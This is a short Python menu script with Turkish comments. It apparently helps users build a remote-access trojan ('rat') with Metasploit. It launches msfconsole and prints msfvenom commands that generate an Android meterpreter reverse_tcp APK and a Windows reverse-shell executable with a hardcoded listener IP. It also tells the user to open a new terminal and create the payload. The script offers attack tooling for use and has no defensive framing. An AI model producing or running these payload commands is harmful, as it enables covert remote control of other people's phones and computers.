#!/bin/env python3 

import os
os.system("clear")
while True:

	print("""

.___          .   
 /   \   ___  _/_  
 |__-'  /   `  |   
 |  \  |    |  |   
 /   \ `.__/|  \__/	

""")
	print("""
 

		Hoşgeldin aga şimdi sana msfvenom  ve msfconsole ile rat nasil 
		yapılır gösterecem knk şimid toola girdiginde metasploit setup.py
		bir dosya görcen tamamı  var sayalim ki şimdi sen metasiploiti 
		kurdun şimid surda msf diye komut var aşagıda  onu şimid açma  
					kurulum biti
""")

	print("""

01)msfconsole 
 
02)ifconfig

03)msfvenom peylod android

04)windows payload msfvenom 

05)clear

06) acıklama

Q}exit 
""")

	islemno =  input("işlem numarasınıgir: ")
	if islemno=="01":

		os.system("msfconsole")
	if islemno=="02":

		os.system("ifconfig")

	if islemno=="03":
 		print("msfvenom -p android/meterpreter/reverse_tcp LHOST=Kendi ipn LPORT=8080 R >/data/data/com.termux/files/home/storage/shared/Android.apk")

	if islemno=="04":
		print("msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f exe > shell.exe")
	if islemno=="05":
		os.system("clear")

	if islemno=="06":
		print("şimdi kardes peyloadi aldin dimi şimdi yeni terminal ac ve peyloadi olustur")

	elif islemno=="q" or islemno=="Q":
			quit()
	else:
		input("hatalı girdin  devam etmek  icin entere bas")
